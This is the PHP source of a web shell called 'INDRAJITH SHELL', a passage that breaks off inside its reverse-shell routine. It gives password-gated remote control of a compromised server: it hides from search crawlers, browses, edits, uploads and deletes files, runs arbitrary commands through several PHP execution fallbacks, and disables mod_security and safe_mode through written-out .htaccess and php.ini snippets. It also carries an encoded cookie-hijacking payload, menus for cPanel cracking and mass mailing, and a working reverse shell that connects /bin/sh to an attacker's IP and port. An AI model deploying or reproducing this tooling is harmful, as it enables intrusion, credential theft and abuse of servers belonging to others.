<?php

/*
 * originally scripted by AJITH KP and VISHNUNATH KP
*/

/*------------------ LOGIN -------------------*/

$usernameame="ajithkp560";
$password="ajithkp560";
$email="ajithkp560@gmail.com";


/*------------------ Login Data End ----------*/

@error_reporting(5);

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
/*------------------ End of Anti Crawler -----*/



    echo "<link href=data:image/gif;base64,R0lGODlhEAAQAPcAADGcADmcADmcCEKcEEKlEEqlGEqlIVKlIVKtIVKtKVqtMWO1OWu1Qmu1SnO1SnO9SnO9Unu9WoS9Y4TGY4zGa4zGc5TGc5TOc5TOe5zOe5zOhK3WlLXepb3ercbntcbnvc7nvc7nxtbvzt7vzt7v1uf33u/35+/37/f37/f/9///9////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ywAAAAAEAAQAAAIxwA7ABhIsGBBgQEAJAwwgIGEBQojEhQwcIEFDRUUUCS4UCEEjAc2RhQJoIGGCAIERODQQOLAAAc0SABwgEMIDgoSShQgAcMAAx08OBCgEYDImA0CbPiwoICHFBIoDogAwAGGAgpCVBggYgUHAwU2nFgBQEIFARVAGNCwAkNVEytCzKwwc0MHASVICHCQ4gTKgRJaVtAgQAQGBSdMJCDZ0WiADyoYAOCg4eVAkQpWCBRgIoTOjTotrHAwECwAgZYpdkBRQGKHgAAAOw== rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url(http://www.ajithkp560.hostei.com/images/background.gif) black; }
    #loginbox { font-size:11px; color:green; width:1000px; height:200px; border:1px solid #4C83AF; background-color:#111111; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
    input { font-size:11px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; }
    loginbox td { border-radius:5px; font-size:11px; }
    .header { size:25px; color:green; }
    h1 { font-family:DigifaceWide; color:green; font-size:200%; }
    h1:hover { text-shadow:0 0 20px #00FFFF, 0 0 100px #00FFFF; }
    .go { height: 50px; width: 50px;float: left; margin-right: 10px; display: none; background-color: #090;}
    .input_big { width:75px; height:30px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; font-size:17px; }
    hr { border:1px solid #222222; }
    #meunlist { width: auto; height: auto; font-size: 12px; font-weight: bold; }
    #meunlist ul { padding-top: 5px; padding-right: 5px; padding-bottom: 7px; padding-left: 2px; text-align:center; list-style-type: none; margin: 0px; }
    #meunlist li { margin: 0px; padding: 0px; display: inline; }
    #meunlist a { font-size: 14px; text-decoration:none; font-weight: bold;color:green;clear: both;width: 100px;margin-right: -6px; padding-top: 3px; padding-right: 15px; padding-bottom: 3px; padding-left: 15px; }
    #meunlist a:hover { background: #222; color:green; border-left:1px solid green; border-right:1px solid green; }
    .menubar {-moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0;  }
    .menu { font-size:25px; color: }
    .textarea_edit { background-color:#111111; border:1px groove #333; color:#999; color:green; }
    .textarea_edit:onfocus { text-decoration:none; border:1px solid green; }
    .input_butt {font-size:11px; background:#191919; color:#4C83AF; margin:0 4px; border:1px solid #222222;}
    #result{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px;}
    .table{ width:100%; padding:4px 0; color:#888; font-size:15px; }
    .table a{ text-decoration:none; color:green; font-size:15px; }
    .table a:hover{text-decoration:underline;}
    .table td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top; }
    .table th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; }
    .table tr:hover{ background:#181818; }
    .tbl{ width:100%; padding:4px 0; color:#888; font-size:15px; text-align:center;  }
    .tbl a{ text-decoration:none; color:green; font-size:15px; vertical-align:middle; }
    .tbl a:hover{text-decoration:underline;}
    .tbl td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px;  vertical-align:middle; width: 300px; }
    .tbl th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; vertical-align:middle; }
    .tbl td:hover{ background:#181818; }
    #alert {position: relative;}
    #alert:hover:after {background: hsla(0,0%,0%,.8);border-radius: 3px;color: #f6f6f6;content: 'Click to dismiss';font: bold 12px/30px sans-serif;height: 30px;left: 50%;margin-left: -60px;position: absolute;text-align: center;top: 50px; width: 120px;}
    #alert:hover:before {border-bottom: 10px solid hsla(0,0%,0%,.8);border-left: 10px solid transparent;border-right: 10px solid transparent;content: '';height: 0;left: 50%;margin-left: -10px;position: absolute;top: 40px;width: 0;}
    #alert:target {display: none;}
    .alert_red {animation: alert 1s ease forwards;background-color: #c4453c;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
    .alert_green {animation: alert 1s ease forwards;background-color: #43CD80;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
    @keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
    </style>";
    if($_COOKIE["user"] != $usernameame && $_COOKIE["pass"] != md5($password))
    {
        if($_POST["usrname"]==$usernameame && $_POST["passwrd"]==$password)
        {
            print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
        }
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("Sorry... Wrong UserName/PassWord");</script>';
            }
            echo '<title>INDRAJITH SHELL</title><center>
            <div id=loginbox><p><font face="verdana,arial" size=-1>
            <font color=orange>>>>>>>>>>></font><font color=white>>>>>><<<<<</font><font color=green>>>>>>>>>>></font>
            <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>INDRAJITH SHELL</b></font></th></tr>
            <tr><td bgcolor="black" style="padding:5">
            <form method="post">
            <input type="hidden" name="action" value="login">
            <input type="hidden" name="hide" value="">
            <center><table>
            <tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" value="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
            <tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="passwrd" value="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
            <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Enter"></font></td></tr></table>
            </div><br /></center>';
            exit;
        }
    }


$color_g="green";
$color_b="4C83AF";
$color_bg="#111111";
$color_hr="#222";
$color_wri="green";
$color_rea="yellow";
$color_non="red";
$path=$_GET['path'];

@session_start();
//@error_reporting(5);
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ini_restore("open_basedir");

$sep="/";
if(strtolower(substr(PHP_OS,0,3))=="win")
{
    $os="win";
    $sep="\\";
    $ox="Windows";
}
else
{
    $os="nix";
    $ox="Linux";
}



$self=$_SERVER['PHP_SELF'];
$srvr_sof=$_SERVER['SERVER_SOFTWARE'];
$your_ip=$_SERVER['REMOTE_ADDR'];
$srvr_ip=$_SERVER['SERVER_ADDR'];
$admin=$_SERVER['SERVER_ADMIN'];

$s_php_ini="safe_mode=OFF
disable_functions=NONE";

$ini_php="<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>";

$s_htaccess="<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>";

$s_htaccess_pl="Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl";

$sym_htaccess="Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any";

$sym_php_ini="safe_mode=OFF
disable_functions=NONE";

$forbid_dir="Options -Indexes";

$cookie_highjacker="rVVdc5pAFH13xv9wh3Eipq22M3miasaJGGmNWsS2mU6HQVyEFlnCLkk7If+9d8EPCKFtpuVB2d1z7z177gf1Wvc8dMN6rXP6av/AJQlIZHGyBouBBaEVcaAOaNOhPninGWNYjNXJBMKIfiM2h53Zaadec+LA5h4N0AXX5nKrXruv1wAfzwF5QzgJbmVpbBhz82KiqVPD1OZSC05OgPHIthixt2El7CVIcfA9oHeB1GplXnfOxdPwQuhBle3bDPiQ/RGfkTKjz+Zopn8a6EN1KN5+z6sEfja7koc/cNTVq5mhmoPhsJpaAfMcRgXDCiIeY4TLDXOh6h9V/UszZ9P8mjKqOHtEtgL1N3QrTMuEK+wPEYoWEeFxFMiIEXd/yJWxTzdDi1u5QkbQhG56kk0Dx9vE2CaIY23+g++dNmxKv3ukQPfDUtWvzYWha9PLA99GRDYe4yQyNz5dWT5DE3lFqd8CL/BMzI3cPEJSRHOfHJGQkn2rmNWCSHvDNJ0ZbNejeHDgszVDis3+hNLzmW4cmccMo1obEhSxaWEvcWUOLrH1cje9YdzcEu7SdcHgSjXGs2Feka3pUvYkg/FskfdIHBKRqBxeV0eqrh6rorHGSdYTPyBLPqwXYpSN4BpcxVMYDA713sBk9xwakkCWsixLWJPWC+mokFA9RNXNrcVtV5Y6K5dvVx0PgZlFC5IESgi/ACkXtxPGnMkiPgbU5kqanwSE5EouKwkICZScSgkMRA6UQkISyFRVirIngMooR+ESGA4M9R4UeMg0wp2L2ey9pirHGu6uov5TA+F/XuGf7pBeQqm+QBA8pu/YPmUkpbrr9kOT45LYLgWpXuuKtPW7LrHWfVxxj/ukf/b6DKaUw4jGwbrbyTbxtJPCuiu6/imW7pt+DoUr3Av7hktw0NzEhIkP61KfgNQuFDnOiIVhLnUNJ2Zbgjv89gboxhFuAGcRdz0GKNEtidrdTpgGTkOKwXOOy18=";

/*----------------------- Top Menu ------------------------------------------*/

if($safemode=="On")
{
    echo "<div id='alert'><a class=\"alert_red\" href=\"#alert\">Safe Mode : <font color=green>ON</font></a></div>";
}
else
{
    echo "<div id='alert'><a class=\"alert_green\" href=\"#alert\">Safe Mode : <font color=red>OFF</font></a></div>";
}

echo "<script src=\"http://code.jquery.com/jquery-latest.js\"></script><script>$(\"#alert\").delay(2000).fadeOut(300);</script>";

echo "<title>INDRAJITH SHELL</title><div id=result>
<table>
    <tbody>
        <tr>
            <td style='border-right:1px solid #104E8B;' width=\"300px;\">
            <div style='text-align:center;'>
                <a href='?' style='text-decoration:none;'><h1>INDRAJITH</h1></a><font color=blue>MINI SHELL</font>
            </div>
            </td>
            <td>
            <div class=\"header\">OS</font> <font color=\"#666\" >:</font>
            ".$ox." </font> <font color=\"#666\" >|</font> ".php_uname()."<br />
            Your IP : <font color=red>".$your_ip."</font> <font color=\"#666\" >|</font> Server IP : <font color=red>".$srvr_ip."</font> <font color=\"#666\" > | </font> Admin <font color=\"#666\" > : </font> <font color=red> {$admin} </font> <br />
            MySQL <font color=\"#666\" > : </font>"; echo mysqlx();
            echo "<font color=\"#666\" > | </font> Oracle <font color=\"#666\" > : </font>"; echo oraclesx();
            echo "<font color=\"#666\" > | </font> MSSQL <font color=\"#666\" > : </font>"; echo mssqlx();
            echo "<font color=\"#666\" > | </font> PostGreySQL <font color=\"#666\" > : </font>";echo postgreyx();
            echo "<br />cURL <font color=\"#666\" > : </font>";echo curlx();
            echo "<font color=\"#666\" > | </font>Total Space<font color=\"#666\" > : </font>"; echo disc_size();
            echo "<font color=\"#666\" > | </font>Free Space<font color=\"#666\" > : </font>"; echo freesize();
            echo "<br />Software<font color=\"#666\" > : </font><font color=red>{$srvr_sof}</font><font color=\"#666\" > | </font> PHP<font color=\"#666\" > : </font><a style='color:red; text-decoration:none;' target=_blank href=?phpinfo>".phpversion()."</a>
            <br />Disabled Functions<font color=\"#666\" > : </font></font><font color=red>";echo disabled_functns()."</font><br />";
            if($os == 'win'){ echo  "Drives <font color=\"#666\" > : </font>";echo  drivesx(); } 
            echo "
            </div>
            </td>
        </tr>
    </tbody>
</table></div>";
echo "<div class='menubar'> <div id=\"meunlist\">
<ul>
<li><a href=\"?\">HOME</a></li>
<li><a href=\"?symlink\">SymLink</a></li>
<li><a href=\"?rs\">Reverse Shell</a></li>
<li><a href=\"?cookiejack\">Cookie HighJack</a></li>
<li><a href=\"?encodefile\">PHP Encode/Decode</a></li>
<li><a href=\"?path={$path}&amp;safe_mod\">Safe Mode Fucker</a></li>
<li><a href=\"?path={$path}&amp;forbd_dir\">Directory Listing Forbidden</a></li>
</ul>
<ul>
<li><a href=\"?massmailer\">Mass Mailer</a></li>
<li><a href=\"?cpanel_crack\">CPANEL Crack</a></li>
<li><a href=\"?server_exploit_details\">Exploit Details</a></li>
<li><a href=\"?remote_server_scan\">Remote Server Scanner</a></li>
<li><a href=\"?remotefiledown\">Remote File Downloader</a></li>
<li><a href=\"?hexenc\">Hexa Encode/Decode</a></li>
<li><a href=\"?killme\"><font color=red>Kill Me</font></a></li>
<li><a href=\"?about_us\">About us</a></li>
</ul>
</div></div>";
/*----------------------- End of Top Menu -----------------------------------*/


/*--------------- FUNCTIONS ----------------*/
function alert($alert_txt)
{
    echo "<script>alert('".$alert_txt."');window.location.href='?';</script>";
}

function disabled_functns()
{
    if(!@ini_get('disable_functions'))
    {
        echo "None";
    }
    else
    {
	echo @ini_get('disable_functions');
    }
}


function drivesx()
{
    foreach(range('A','Z') as $drive)
    {
        if(is_dir($drive.':\\'))
        {
            echo "<a style='color:green; text-decoration:none;' href='?path=".$drive.":\\'>[".$drive."]</a>"; 
        }
    }
}

function filesizex($size)
{
    if ($size>=1073741824)$size = round(($size/1073741824) ,2)." GB";
    elseif ($size>=1048576)$size = round(($size/1048576),2)." MB";
    elseif ($size>=1024)$size = round(($size/1024),2)." KB";
    else $size .= " B";
    return $size;
}

function disc_size()
{
    echo filesizex(disk_total_space("/"));
}

function freesize()
{
    echo filesizex(disk_free_space("/"));
}

function file_perm($filz){
	if($m=fileperms($filz)){
		$p='';
		$p .= ($m & 00400) ? 'r' : '-';
		$p .= ($m & 00200) ? 'w' : '-';
		$p .= ($m & 00100) ? 'x' : '-';
		$p .= ($m & 00040) ? 'r' : '-';
		$p .= ($m & 00020) ? 'w' : '-';
		$p .= ($m & 00010) ? 'x' : '-';
		$p .= ($m & 00004) ? 'r' : '-';
		$p .= ($m & 00002) ? 'w' : '-';
		$p .= ($m & 00001) ? 'x' : '-';
		return $p;
	}
	else return "?????";
}


function mysqlx()
{
    if(function_exists('mysql_connect'))
    {
        echo "<font color='red'>Enabled</font>";
    }
    else
    {
        echo "<font color='green'>Disabled</font>";
    }   
}

function oraclesx()
{
    if(function_exists('oci_connect'))
    {
        echo "<font color='red'>Enabled</font>";
    }
    else
    {
        echo "<font color='green'>Disabled</font>";
    }
}

function mssqlx()
{
    if(function_exists('mssql_connect'))
    {
        echo "<font color='red'>Enabled</font>";
    }
    else
    {
        echo "<font color='green'>Disabled</font>";
    }   
}

function postgreyx()
{
    if(function_exists('pg_connect'))
    {
        echo "<font color='red'>Enabled</font>";
    }
    else
    {
        echo "<font color='green'>Disabled</font>";
    } 
}

function curlx()
{
    if(function_exists('curl_version'))
    {
        echo "<font color='red'>Enabled</font>";
    }
    else
    {
        echo "<font color='green'>Disabled</font>";
    } 
}

function filesize_x($filex)
{
    $f_size=filesizex(filesize($filex));
    return $f_size;
}

function rename_ui()
{
    $rf_path=$_GET['rename'];
    echo "<div id=result><center><h2>Rename</h2><hr /><p><br /><br /><form method='GET'><input type=hidden name='old_name' size='40' value=".$rf_path.">New Name : <input name='new_name' size='40' value=".basename($rf_path)."><input type='submit' value='   >>>   ' /></form></p><br /><br /><hr /><br /><br /></center></div>";
}

function filemanager_bg()
{
    global $sep, $self;
    $path=!empty($_GET['path'])?$_GET['path']:getcwd();
    $dirs=array();
    $fils=array();
    if(is_dir($path))
    {
        chdir($path);
        if($handle=opendir($path))
        {
            while(($item=readdir($handle))!==FALSE)
            {
                if($item=="."){continue;}
                if($item==".."){continue;}
                if(is_dir($item))
                {
                    array_push($dirs, $path.$sep.$item);
                }
                else
                {
                    array_push($fils, $path.$sep.$item);
                }
            }
        }
        else
        {
            alert("Access Denied for this operation");
        }
    }
    else
    {
        alert("Directory Not Found!!!");
    }
    echo "<div id=result><table class=table>
    <tr>
    <th width='500px'>Name</th>
    <th width='100px'>Size</th>
    <th width='100px'>Permissions</th>
    <th width='500px'>Actions</th>
    </tr>";
    foreach($dirs as $dir)
    {//chdir(isset($_GET['path']))
        echo "<tr><td><a href={$self}?path={$dir}>".basename($dir)."</a></td>
              <td>".filesize_x($dir)."</td>
              <td><a href={$self}?path={$path}&amp;perm={$dir}>".file_perm($dir)."</a></td>
              <td><a href={$self}?path={$path}&amp;del_dir={$dir}>Delete</a> | <a href={$self}?path={$path}&amp;rename={$dir}>Rename</a></td></tr>";
    }
    foreach($fils as $fil)
    {
        echo "<tr><td><a href={$self}?path={$path}&amp;read={$fil}>".basename($fil)."</a></td>
              <td>".filesize_x($fil)."</td>
              <td><a href={$self}?path={$path}&amp;perm={$fil}>".file_perm($fil)."</a></td>
              <td><a href={$self}?path={$path}&amp;del_fil={$fil}>Delete</a> | <a href={$self}?path={$path}&amp;rename={$fil}>Rename</a> | <a href={$self}?path={$path}&amp;edit={$fil}>Edit</a> | <a href={$self}?path={$path}&amp;down={$fil}>Download</a> | <a href={$self}?path={$path}&amp;copy={$fil}>Copy</a>  </td>";
    }
    echo "</tr></table></div>";
}

function rename_bg()
{
    if(isset($_GET['old_name']) && isset($_GET['new_name']))
    {
        $o_r_path=basename($_GET['old_name']);
        $r_path=str_replace($o_r_path, "", $_GET['old_name']);
        $r_new_name=$r_path.$_GET['new_name'];
        echo $r_new_name;
        if(rename($_GET['old_name'], $r_new_name)==FALSE)
        {
            alert("Access Denied for this action!!!");
        }
        else
        {
            alert("Renamed File Succeessfully");
        }
    }
}

function edit_file()
{
    $path=$_GET['path'];
    chdir($path);
    $edt_file=$_GET['edit'];
    $e_content = wordwrap(htmlspecialchars(file_get_contents($edt_file)));
    if($e_content)
    {
        $o_content=$e_content;
    }
    else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
    {
        $fd = fopen($edt_file, "rb");
	if(!$fd)
        {
            alert("Permission Denied");
        }
	else
        {
            while(!feof($fd))
            {
                $o_content=wordwrap(htmlspecialchars(fgets($fd)));
            }
        }
        fclose($fd);
    }
    echo "<div id='result'><br /><font color=red>View File</font> : <font color=green><a style='text-decoration:none; color:green;' href='?read=".$_GET['edit']."'>".  basename($_GET['edit'])  ."</a><br /><br /><hr /><br /></font><form method='POST'><input type='hidden' name='e_file' value=".$_GET['edit'].">
          <center><textarea spellcheck='false' class='textarea_edit' name='e_content_n' cols='80' rows='25'>".$o_content."</textarea></center><hr />
          <input class='input_big' name='save' type='submit' value='   Save   ' /></div>";
}
function edit_file_bg()
{
    if(file_exists($_POST['e_file']))
    {
        $handle = fopen($_POST['e_file'],"w+");
	if (!handle)
        {
            alert("Permission Denied");
        }
	else
        {
            fwrite($handle,$_POST['e_content_n']);
            alert("Your changes were Successfully Saved!");
        }
        fclose($handle);
    }
    else
    {
        alert("File Not Found!!!");
    }
}
function delete_file()
{
    $del_file=$_GET['del_fil'];
    if(unlink($del_file) != FALSE)
    {
        alert("Deleted Successfully");
        exit;
    }
    else
    {
        alert("Access Denied for this Operation");
        exit;
    }
}
function deldirs($d_dir)
{
    $d_files= glob($d_dir.'*', GLOB_MARK);
    foreach($d_files as $d_file)
    {
        if(is_dir($d_file))
        {
            deldirs($d_file);
        }
        else
        {
            unlink($d_file);
        }
    }
    if(is_dir($d_dir))
    {
        if(rmdir($d_dir))
        {
            alert("Deleted Directory Successfully");
        }
        else
        {
            alert("Access Denied for this Operation");
        }
    }
}
function download()
{
    $d_file=$_GET['down'];
    $d_name=basename($d_file);
    if (file_exists($d_file))
    {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='. basename($d_file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($d_file));
        ob_clean();
        
        readfile($d_file);
        exit;
    }
}
function code_viewer()
{
    $path=$_GET['path'];
    $r_file=$_GET['read'];
    $r_content = wordwrap(htmlspecialchars(file_get_contents($r_file)));
    if($r_content)
    {
        $rr_content=$r_content;
    }
    else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
    {
        $fd = fopen($r_file, "rb");
	if (!$fd)
        {
            alert("Permission Denied");
        }
	else
        {
            while(!feof($fd))
            {
                $rr_content=wordwrap(htmlspecialchars(fgets($fd)));
            }
        }
        fclose($fd);
    }
    echo "<div id=result><br /><font color=red>Edit File</font><font color=green> : </font><font color=#999><a style='text-decoration:none; color:green;' href='?path={$path}&amp;edit=".$_GET['read']."'>".  basename($_GET['read'])  ."</a></font><br /><br /><hr /><pre><code>".$rr_content."</code></pre></div>";
}
function copy_file_ui()
{
    echo "<div id=result><center><h2>Copy File</h2><hr /><br /><br /><table class=table><form method='GET'><tr><td style='text-align:center;'>Copy : <input size=40 name='c_file' value=".$_GET['copy']." > To : <input size=40 name='c_target' value=".$_GET['path'].$sep."> Name : <input name='cn_name'><input type='submit' value='   >>   ' /></form></table><br /><br /><hr /><br /><br /><br /></center></div>";
}
function copy_file_bg()
{
    global $sep;
    if(function_exists(copy))
    {
        if(copy($_GET['c_file'], $_GET['c_target'].$sep.$_GET['cn_name']))
        {
            alert("Succeded");
        }
        else
        {
            alert("Access Denied");
        }
    }
}
function ch_perm_bg()
{
    if(isset($_GET['p_filex']) && isset($_GET['new_perm']))
    {
        if(chmod($_GET['p_filex'], $_GET['new_perm']) !=FALSE)
        {
            alert("Succeded. Permission Changed!!!");
        }
        else
        {
            alert("Access Denied for This Operation");
        }
    }
}
function ch_perm_ui()
{
    $p_file=$_GET['perm'];
    echo "<div id =result><center><p><form method='GET'><input type='hidden' name='path' value=".getcwd()." ><input name='p_filex' type=hidden value={$p_file} >New Permission : <input name='new_perm' isze='40' value=".substr(sprintf('%o', fileperms($p_file)), -3)."><input type='submit' value='   >>   ' /></form></p></center></div>";
    ch_perm_bg();
}
function mk_file_ui()
{
    chdir($_GET['path']);
    echo "<div id=result><br /><br /><font color=red><form method='GET'>
          <input type='hidden' name='path' value=".getcwd().">
          New File Name : <input size='40' name='new_f_name' value=".$_GET['new_file']."></font><br /><br /><hr /><br /><center>
          <textarea spellcheck='false' cols='80' rows='25' class=textarea_edit name='n_file_content'></textarea></center><hr />
          <input class='input_big' type='submit' value='  Save  ' /></form></center></div>";
}
function mk_file_bg()
{
    chdir($_GET['path']);
    $c_path=$_GET['path'];
    $c_file=$_GET['new_f_name'];
    $c_file_contents=$_GET['n_file_content'];
    $handle=fopen($c_file, "w");
    if(!$handle)
    {
        alert("Permission Denied");
    }
    else
    {
        fwrite($handle,$c_file_contents);
        alert("Your changes were Successfully Saved!");
    }
    fclose($handle);
}
function create_dir()
{
    chdir($_GET['path']);
    $new_dir=$_GET['new_dir'];
    if(is_writable($_GET['path']))
    {
        mkdir($new_dir);
        alert("Direcory Created Successfully");
        exit;
    }
    else
    {
        alert("Access Denied for this Operation");
        exit;
    }
}
function cmd($cmd)
{
    chdir($_GET['path']);
    $res="";
    if($_GET['cmdexe'])
    {
        $cmd=$_GET['cmdexe'];
    }
    if(function_exists('shell_exec'))
    {
        $res=shell_exec($cmd);
    }
    else if(function_exists('exec'))
    {
        exec($cmd,$res);
        $res=join("\n",$res);
    }
    else if(function_exists('system'))
    {
        ob_start();
        system($cmd);
        $res = ob_get_contents();
        ob_end_clean();   
    }
    elseif(function_exists('passthru'))
    {
	ob_start();
	passthru($cmd);
	$res=ob_get_contents();
	ob_end_clean();
    }
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
        $handle = proc_open($cmd ,$descriptorspec , $pipes);
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $res .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $res .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($cmd , "r");
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $res .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $res .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    $res=wordwrap(htmlspecialchars($res));
    if($_GET['cmdexe'])
    {
        echo "<div id=result><center><font color=green><h2>r00t@TOF:~#</h2></center><hr /><pre>".$res."</font></pre></div>";
    }
    return $res;
}
function upload_file()
{
    chdir($_POST['path']);
    if(move_uploaded_file($_FILES['upload_f']['tmp_name'],$_FILES['upload_f']['name']))
    {
        alert("Uploaded File Successfully");
    }
    else
    {
        alert("Access Denied!!!");
    }
}

function reverse_conn_ui()
{
    global $your_ip;
    echo "<div id='result'>
          <center><h2>Reverse Shell</h2><hr />
          <br /><br /><form method='GET'><table class=tbl>
          <tr>
          <td><select name='rev_option' style='color:green; background-color:black; border:1px solid #666;'>
                      <option>PHP Reverse Shell</option>
          </select></td></tr><tr>
          <td>Your IP : <input name='my_ip' value=".$your_ip.">
          PORT : <input name='my_port' value='560'>
          <input type='submit' value='   >>   ' /></td></tr></form>
          <tr></tr>
          <tr><td><font color=red>PHP Reverse Shell</font>:<font color=green> nc -l -p <i>port</i></font></td></tr></table> </div>";
}
function reverse_conn_bg()
{
    global $os;
    $option=$_REQUEST['rev_option'];
    $ip=$_GET['my_ip'];
    $port=$_GET['my_port'];
    if($option=="PHP Reverse Shell")
    {
        echo "<div id=result><h2>RESULT</h2><hr /><br />";
        function printit ($string)
        {
            if (!$daemon)
            {
		print "$string\n";
            }
        }
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;
        if (function_exists('pcntl_fork'))
        {
            $pid = pcntl_fork();
            if ($pid == -1)
            {
		printit("ERROR: Can't fork");
		exit(1);
            }
            if ($pid)
            {
		exit(0);
            }
            if (posix_setsid() == -1)
            {
		printit("Error: Can't setsid()");
		exit(1);
            }
            $daemon = 1;
        }
        else
        {
            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }
        chdir("/");
        umask(0);
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock)
        {
            printit("$errstr ($errno)");
            exit(1);
        }
        $descriptorspec = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
        $process = proc_open($shell, $descriptorspec, $pipes);
        if (!is_resource($process))
        {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        printit("<font color=green>Successfully opened reverse shell to $ip:$port </font>");
        while (1)
        {
            if (feof($sock))
            {
		printit("ERROR: Shell connection terminated");
		break;
            }
            if (feof($pipes[1]))
            {
		printit("ERROR: Shell process terminated");
		break;
            }
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            if (in_array($sock, $read_a))
            {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
            }
            if (in_array($pipes[1], $read_a))
            {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
            }
            if (in_array($pipes[2], $read_a))
            {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
